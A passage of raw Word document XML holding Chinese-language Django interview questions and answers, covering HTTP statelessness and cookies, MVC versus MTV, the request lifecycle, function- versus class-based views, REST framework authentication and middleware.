          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>返回</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="067DC161" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRDefault="006B2B80" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="105"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:ind w:left="480"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>无状态保存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21705C9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    HTTP是一种不保存状态,即无状态(stateless)协议。HTTP协议自身不对请求和响应之间的通信状态进行保存。也就是说在HTTP这个级别,协议对于发送过的请求或响应都不做持久化处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E9BCE3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    使用HTTP协议,每当有新的请求发送时,就会有对应的新响应产生。协议本身并不保留之前一切的请求或响应报文的信息。这是为了更快地处理大量事务,确保协议的可伸缩性,而特意把HTTP协议设计成 如此简单的。可是,随着Web的不断发展,因无状态而导致业务处理变得棘手 的情况增多了。比如,用户登录到一家购物网站,即使他跳转到该站的 其他页面后,也需要能继续保持登录状态。针对这个实例,网站为了能 够掌握是谁送出的请求,需要保存用户的状态。HTTP/1.1虽然是无状态协议,但为了实现期望的保持状态功能, 于是引入了Cookie技术。有了Cookie再用HTTP协议通信,就可以管 理状态了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A43D066" w14:textId="65397167" w:rsidR="006B2B80" w:rsidRPr="008E43D1" w:rsidRDefault="00AD41B7"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8E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>014</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简述</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MVC</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>模式和</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MVT</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>模式？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="469EDBF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所谓</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>MVC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>就是把</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>应用分为模型</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(M)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，控制器</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(C)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和视图</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(V)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>三层</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>他们之间以一种插件式的、松耦合的方式连接在一起，模型负责业务对象与数据库的映射</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(ORM)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，视图负责与用户的交互</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>页面</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，控制器接受用户的输入调用模型和视图完成用户的请求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="576905FE" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRDefault="006B2B80" w:rsidP="00AD41B7">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56070511" wp14:editId="665A2FE5">
            <wp:extent cx="4068445" cy="3664585"/>
            <wp:effectExtent l="0" t="0" r="825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68445" cy="3664585"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="034C058A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="006B2B80" w:rsidP="006B2B80">
      <w:pPr>
        <w:pStyle w:val="a7"/>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MTV</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7317BFC1" w14:textId="027CA82A" w:rsidR="006B2B80" w:rsidRDefault="006B2B80" w:rsidP="006B2B80">
      <w:pPr>
        <w:pStyle w:val="a7"/>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    Django的MTV模式本质上和MVC是一样的，也是为了各组件间保持松耦合关系，只是定义上有些许不同，Django的MTV分别是值：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71245130" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRDefault="006B2B80" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="106"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="120" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="600"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>M 代表模型（Model）： 负责业务对象和数据库的关系映射(ORM)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="194B84DE" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRDefault="006B2B80" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="106"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="120" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="600"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>T 代表模板 (Template)：负责如何把页面展示给用户(html)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B5C1B3B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="006B2B80" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="106"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:ind w:left="600"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>V 代表视图（View）： 负责业务逻辑，并在适当时候调用Model和Template。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0134F7D1" w14:textId="167D2E0B" w:rsidR="006B2B80" w:rsidRDefault="006B2B80" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="106"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:ind w:left="600"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>除了以上三层之外，还需要一个URL分发器，它的作用是将一个个URL的页面请求分发给不同的View处理，View再调用相应的Model和Template，MTV的响应模式如下所示：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6813C51F" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRDefault="006B2B80" w:rsidP="00AD41B7">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2CEC526A" wp14:editId="01226768">
            <wp:extent cx="7095490" cy="31330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7095490" cy="3133090"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="597E18F1"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hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>    </w:t>
      </w:r>
      <w:r w:rsidRPr="003D1617">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>一般是用户通过浏览器向我们的服务器发起一个请求(request)，这个请求回去访问视图函数，（如果不涉及到数据调用，那么这个时候视图函数返回一个模板也就是一个网页给用户），视图函数调用模型，模型去数据库查找数据，然后逐级返回，视图函数把返回的数据填充到模板中空格中，最后返回网页给用户。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="558FC352" w14:textId="30E11BC1" w:rsidR="006B2B80" w:rsidRPr="008E43D1" w:rsidRDefault="00AD41B7"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8E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>015</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简述</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>请求生命周期？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0744FE9A"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color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>   一般是用户通过浏览器向我们的服务器发起一个请求(request)，这个请求回去访问视图函数，（如果不涉及到数据调用，那么这个时候视图函数返回一个模板也就是一个网页给用户），视图函数调用模型，模型去数据库查找数据，然后逐级返回，视图函数把返回的数据填充到模板中空格中，最后返回网页给用户。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CE81D4D"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color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#1.wsgi,请求封装后交给web框架 （Flask、Django）     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FB91E7D"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color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#2.中间件，对请求进行校验或在请求对象中添加其他相关数据，例如：csrf、request.session - </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BD383A5"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color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#3.路由匹配 根据浏览器发送的不同url去匹配不同的视图函数    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C6E0983"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color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#4.视图函数，在视图函数中进行业务逻辑的处理，可能涉及到：orm、templates =&gt; 渲染 - </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546FC5BF"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color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#5.中间件，对响应的数据进行处理。 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F022499" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRPr="003D1617" w:rsidRDefault="006B2B80" w:rsidP="003D161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D1617">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#6.wsgi,将响应的内容发送给浏览器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7042F738" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRDefault="006B2B80" w:rsidP="006B2B80">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1FE5AB6B" wp14:editId="48EDE8E9">
            <wp:extent cx="2501900" cy="37922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01900" cy="3792220"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="51FF43BD" w14:textId="77777777" w:rsidR="008E43D1" w:rsidRDefault="00AD41B7" w:rsidP="006B2B80">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>016</w:t>
      </w:r>
      <w:r w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>简述什么是</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>FBV</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CBV</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B1AC012" w14:textId="77777777" w:rsidR="00D8288D"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color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>FBV（function base views）就是在视图函面使用函数处理请求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5412FFED" w14:textId="778D8456"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color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CBV（class base views）就是在视图里面使用类处理请求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7136B15D" w14:textId="77777777" w:rsidR="00D8288D"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hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>FBV和CBV本质是一样的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4472E5EB" w14:textId="77777777" w:rsidR="00D8288D"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hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>基于函数的视图叫做FBV，基于类的视图叫做CBV</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C1B2EFD" w14:textId="77777777" w:rsidR="00D8288D"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hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>在python中使用CBV的优点：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64CEE67D" w14:textId="77777777" w:rsidR="00D8288D"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hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1.提高了代码的复用性，可以使用面向对象的技术，比如Mixin（多继承）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77F1062E" w14:textId="09E6581C"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hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2.可以用不同的函数针对不同的HTTP方法处理，而不是通过很多if判断，提高代码可读性</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69746669" w14:textId="1707B054" w:rsidR="006B2B80" w:rsidRPr="008E43D1" w:rsidRDefault="00AD41B7"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8E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>018</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 xml:space="preserve">rest_framework </w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>认证组件的流程？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3189A868" w14:textId="77777777"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color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#4.认证组件 写一个类并注册到认证类(authentication_classes)，在类的的authticate方法中编写认证逻</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="090E6498" w14:textId="73496958" w:rsidR="006B2B80" w:rsidRPr="008E43D1" w:rsidRDefault="00AD41B7"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8E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>019</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什么是中间件并简述其作用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0835C149" w14:textId="77777777"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hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>    中间件是一个用来处理Django的请求和响应的框架级别的钩子。它是一个轻量、低级别的插件系统，用于在全局范围内改变Django的输入和输出。每个中间件组件都负责做一些特定的功能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1144CB7D" w14:textId="77777777"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color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>    中间件是介于request与response处理之间的一道处理过程，相对比较轻量级，并且在全局上改变django的输入与输出。</w:t>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_label8"/>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w14:paraId="173F3635" w14:textId="11AB966F" w:rsidR="006B2B80" w:rsidRPr="008E43D1" w:rsidRDefault="00AD41B7"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1" w:name="t8"/>
      <w:bookmarkEnd w:id="1"/>
      <w:r w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>020</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 xml:space="preserve">django </w:t>
      </w:r>
